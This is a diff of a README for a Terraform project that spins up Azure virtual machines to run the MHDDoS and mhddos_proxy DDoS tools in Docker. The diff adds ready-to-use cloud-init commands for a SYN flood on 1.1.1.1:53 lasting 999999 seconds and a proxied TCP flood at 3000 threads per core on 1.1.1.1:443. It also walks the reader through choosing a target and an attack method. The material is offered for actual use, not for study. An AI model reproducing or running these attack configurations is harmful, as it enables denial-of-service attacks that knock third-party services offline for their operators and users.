@@ -2,7 +2,7 @@
 
 # Overview
 
-Here I use Terraform to automate Azure VM deployment which run MHDDOS docker container (actually can run any container).
+Here I use Terraform to automate Azure VM deployment which run [MHDDOS](https://github.com/MHProDev/MHDDoS) or [MHDDOS_PROXY](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) docker container.
 You can deploy VMs to any Azure region, I prefer those that are located in Asia. Table of available regions:
 
 | Region code        |     Region Name      |
@@ -96,17 +96,24 @@ cd mhddos-azure-terraform/
 az login
 ```
 4. Select target and attack method. Open the `cloud-init.yaml` file in any text editor. Find the `runcmd` attribute.  
-   `docker run --name mhddos --rm -d djebos/mhddos:latest` part of command is static and must be preserved. All your
+   - For original [MHDDOS](https://github.com/MHProDev/MHDDoS) `docker run --name mhddos --rm -d djebos/mhddos:latest` part of command is static and must be preserved. All your
    customizations must follow this command as in example below:
-
+  ```yaml
+  # TCP syn flood attack on ip 1.1.1.1, port 53, 100 threads, duration 999999 seconds
+  runcmd:
+    - "docker run --name mhddos --rm -d djebos/mhddos:latest syn 1.1.1.1:53 100 999999 --debug"
+  # here 'syn 1.1.1.1:53 100 999999' is your attack configuration that fully compliant with original MHDDOS
+  ```
+  More about types of supported attacks on [MHDDOS oficial page](https://github.com/MHProDev/MHDDoS)
+  - For [MHDDOS_PROXY](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) 
+    `- "docker run --name mhddosProxy -d --rm portholeascend/mhddos_proxy` part of command is static and must be preserved.  
+    All your customizations must follow this command as in example below:
 ```yaml
-# TCP syn flood attack on ip 1.1.1.1, port 53, 100 threads, duration 999999 seconds
+# TCP flood attack on ip 1.1.1.1, port 80, 3000 threads per core, proxy refresh every 300 seconds, requests per proxy 50
 runcmd:
-  - docker run --name mhddos --rm -d djebos/mhddos:latest syn 1.1.1.1:53 100 999999
-# here 'syn 1.1.1.1:53 100 999999' is your attack configuration that fully compliant with original MHDDOS
+  - "docker run --name mhddosProxy -d --rm portholeascend/mhddos_proxy tcp://1.2.3.4:80 tcp://1.1.1.1:443 -t 3000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug"
+# here 'tcp://1.1.1.1:443 -t 3000 -p 300 --rpc 50 --http-methods TCP FLOOD --debug' is your attack configuration that fully compliant with MHDDOS_PROXY
 ```
-
-More about types of supported attacks on [MHDDOS oficial page](https://github.com/MHProDev/MHDDoS)  
 Save the `cloud-init.yaml` file.
 
 ## Automatic flow
